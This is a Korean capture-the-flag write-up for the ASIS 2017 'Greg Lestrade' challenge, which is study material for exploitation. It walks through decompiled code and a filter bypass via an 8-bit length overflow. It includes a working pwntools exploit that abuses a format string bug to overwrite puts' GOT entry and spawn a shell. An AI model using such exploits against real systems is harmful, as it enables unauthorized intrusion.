# [2017_ASIS] \[PWN] Greg Lestrade

### Check Security

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



### Solution

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax@2
  __int64 v4; // rcx@9
  int v5; // [sp+2Ch] [bp-34h]@1
  __int64 buf; // [sp+30h] [bp-30h]@1
  __int64 v7; // [sp+38h] [bp-28h]@1
  __int64 v8; // [sp+40h] [bp-20h]@1
  __int64 v9; // [sp+48h] [bp-18h]@1
  __int64 v10; // [sp+58h] [bp-8h]@1

  v10 = *MK_FP(__FS__, 40LL);
  sub_40088C();
  buf = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v5 = 0;
  puts("[*] Welcome admin login system! \n");
  puts("Login with your credential...");
  printf("Credential : ");
  read(0, &buf, 0x200uLL);
  if ( sub_4008D9(&buf, &buf) )
  {
    while ( 1 )
    {
      puts("0) exit");
      puts("1) admin action");
      __isoc99_scanf("%d", &v5);
      if ( !v5 )
        break;
      if ( v5 == 1 )
        sub_40091F();
      else
        puts("Wrong.");
    }
    puts("Good bye, admin :)");
    result = 0LL;
  }
  else
  {
    puts("[!] Sorry, wrong credential");
    result = 0LL;
  }
  v4 = *MK_FP(__FS__, 40LL) ^ v10;
  return result;
}
```

Credential 조건문을 통과해야 합니다.



```c
__int64 __fastcall sub_4008D9(const char *a1)
{
  size_t v1; // rax@1

  v1 = strlen(s1);
  return strncmp(s1, a1, v1) == 0;
}
```

s1의 값은 `7h15_15_v3ry_53cr37_1_7h1nk`입니다.



####취약점1 - Format String Bug

```
__int64 sub_40091F()
{
  __int64 result; // rax@4
  __int64 v1; // rsi@8
  unsigned __int8 i; // [sp+Eh] [bp-412h]@1
  unsigned __int8 v3; // [sp+Fh] [bp-411h]@1
  char buf[1032]; // [sp+10h] [bp-410h]@1
  __int64 v5; // [sp+418h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  memset(buf, 0, 0x400uLL);
  puts("[*] Hello, admin ");
  printf("Give me your command : ");
  read(0, buf, 0x3FFuLL);
  v3 = strlen(buf) + 1;
  for ( i = 0; i < v3; ++i )
  {
    if ( buf[i] <= 96 || buf[i] > 122 )
    {
      puts("[*] for secure commands, only lower cases are expected. Sorry admin");
      result = 0LL;
      goto LABEL_8;
    }
  }
  printf(buf, buf);
  result = 0LL;
LABEL_8:
  v1 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
}
```

admin action 함수 내부를 보면 포맷스트링버그가 발생함을 알 수 있습니다.

하지만 입력값에 필터링이 걸려있습니다. 출제자가 일부러 어떤 값을 입력하든지 간에 무조건 필터링에 걸리도록 해놨습니다. 이를 우회해야 Exploit이 가능합니다.



#### 취약점2 - Type Confusion

입력값의 길이를 0x300으로 하고 실행해봤는데 필터링이 우회되었습니다. 그 이유가 뭔지 봤더니 v3 변수의 타입이 `unsigned __int8 v3` 와 같이 선언되어 있었습니다. 입력 값을 0x100만큼 하면 `v3=0`이 되어 필터링이 수행되지 않습니다.

```python
from pwn import *

context.clear(arch='amd64')
p = process("./greg_lestrade")

print p.recv()
credential = "7h15_15_v3ry_53cr37_1_7h1nk"
payload = credential
p.send(payload)
print payload
print p.recv()
p.sendline("1")
print p.recv()
p.send("d"*0x300+"%138$9p")		# stack address leak
p.recvuntil("0x")
stack_addr = int(p.recvuntil("0) ")[:-3],16)-0x68
print p.recv()
log.info("stack_addr = " + hex(stack_addr))
p.sendline("1")
print p.recv()

puts_got = 0x602020
sh = 0x400876

payload = "%40$n"
payload += "a"*0x08
payload += "%41$hhn"
payload += "a"*(0x40-0x08)
payload += "%42$hhn"
payload += "a"*(0x76-0x40)
payload += "%43$hhn"
payload += "d"*(255 - len(payload)) + "\x00"
payload += p64(puts_got+3)
payload += p64(puts_got+1)
payload += p64(puts_got+2)
payload += p64(puts_got)

p.send(payload)
p.interactive()
```



### Result

```
# python ex.py 
[+] Starting local process './greg_lestrade': pid 13102
[*] Welcome admin login system! 

Login with your credential...
Credential : 
7h15_15_v3ry_53cr37_1_7h1nk
0) exit
1) admin action

[*] Hello, admin 
Give me your command : 
exit
1) admin action

[*] stack_addr = 0x7fffffffe2e8
[*] Hello, admin 
Give me your command : 
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/bin/cat: ./flag: No such file or directory
/bin/cat: ./flag: No such file or directory
```

